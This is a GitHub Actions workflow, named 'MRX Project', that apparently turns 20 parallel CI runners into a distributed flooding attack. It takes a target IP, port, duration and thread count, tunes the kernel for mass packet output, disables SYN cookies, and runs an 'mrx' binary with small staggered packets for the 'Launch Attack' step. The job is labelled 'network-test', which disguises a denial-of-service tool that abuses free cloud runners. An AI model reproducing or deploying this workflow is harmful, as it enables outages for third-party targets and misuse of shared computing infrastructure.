name: "MRX Project - Optimized"
on:
  workflow_dispatch:
    inputs:
      ip:
        description: "Target IP"
        required: true
        type: string
      port:
        description: "Target Port" 
        required: true
        type: string
      duration:
        description: "Attack Duration"
        required: true
        type: string
      packet_size:
        description: "Base Packet Size"
        required: true
        type: string
      threads:
        description: "Connection Threads"
        required: true
        type: string

jobs:
  network-test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        worker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
        max-parallel: 20
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
      
    - name: Setup Environment
      run: |
        echo "MRX Attack - Worker ${{ matrix.worker }}"
        echo "Target: ${{ github.event.inputs.ip }}:${{ github.event.inputs.port }}"
        echo "Duration: ${{ github.event.inputs.duration }}s"
        echo "Threads: ${{ github.event.inputs.threads }}"
        
    - name: Apply Full Kernel Tuning
      run: |
        # Full optimization from fixed code
        sudo sysctl -w net.core.wmem_max=1073741824 >/dev/null 2>&1 || true
        sudo sysctl -w net.core.wmem_default=268435456 >/dev/null 2>&1 || true
        sudo sysctl -w net.core.rmem_max=1073741824 >/dev/null 2>&1 || true
        sudo sysctl -w net.core.rmem_default=268435456 >/dev/null 2>&1 || true
        sudo sysctl -w net.core.netdev_max_backlog=10000000 >/dev/null 2>&1 || true
        sudo sysctl -w net.core.optmem_max=33554432 >/dev/null 2>&1 || true
        sudo sysctl -w net.core.somaxconn=1048576 >/dev/null 2>&1 || true
        
        sudo sysctl -w net.ipv4.udp_mem='25165824 50331648 100663296' >/dev/null 2>&1 || true
        sudo sysctl -w net.ipv4.udp_rmem_min=131072 >/dev/null 2>&1 || true
        sudo sysctl -w net.ipv4.udp_wmem_min=131072 >/dev/null 2>&1 || true
        sudo sysctl -w net.ipv4.ip_local_port_range='1024 65535' >/dev/null 2>&1 || true
        
        sudo sysctl -w net.ipv4.tcp_timestamps=0 >/dev/null 2>&1 || true
        sudo sysctl -w net.ipv4.tcp_sack=0 >/dev/null 2>&1 || true
        sudo sysctl -w net.ipv4.tcp_syncookies=0 >/dev/null 2>&1 || true
        sudo sysctl -w net.ipv4.tcp_ecn=0 >/dev/null 2>&1 || true
        
        sudo sysctl -w vm.swappiness=0 >/dev/null 2>&1 || true
        sudo sysctl -w vm.min_free_kbytes=131072 >/dev/null 2>&1 || true
        
        ulimit -n 1048576 >/dev/null 2>&1 || true
        ulimit -u unlimited >/dev/null 2>&1 || true
      
    - name: Verify Binary
      run: |
        if [ ! -f "./mrx" ]; then
          echo "ERROR: mrx binary not found!"
          exit 1
        fi
        chmod +x mrx
      
    - name: Launch Attack with Staggering
      run: |
        # Staggered start: 100ms delay per worker
        WORKER_DELAY_MS=$(( (${{ matrix.worker }} - 1) * 100 ))
        sleep 0.$(printf "%03d" $WORKER_DELAY_MS)
        
        # Worker-specific packet size variation
        WORKER_MOD=$(( ${{ matrix.worker }} % 4 ))
        if [ $WORKER_MOD -eq 0 ]; then
          ACTUAL_PACKET_SIZE=40
        elif [ $WORKER_MOD -eq 1 ]; then
          ACTUAL_PACKET_SIZE=56
        elif [ $WORKER_MOD -eq 2 ]; then
          ACTUAL_PACKET_SIZE=64
        else
          ACTUAL_PACKET_SIZE=72
        fi
        
        echo "Worker ${{ matrix.worker }} starting with ${WORKER_DELAY_MS}ms delay, packet size: ${ACTUAL_PACKET_SIZE}"
        
        TIMEOUT=$(( ${{ github.event.inputs.duration }} + 12 ))
        
        timeout ${TIMEOUT}s ./mrx \
          "${{ github.event.inputs.ip }}" \
          "${{ github.event.inputs.port }}" \
          "${{ github.event.inputs.duration }}" \
          "${ACTUAL_PACKET_SIZE}" \
          "${{ github.event.inputs.threads }}" 2>&1 || true
        
        echo "Worker ${{ matrix.worker }} completed"
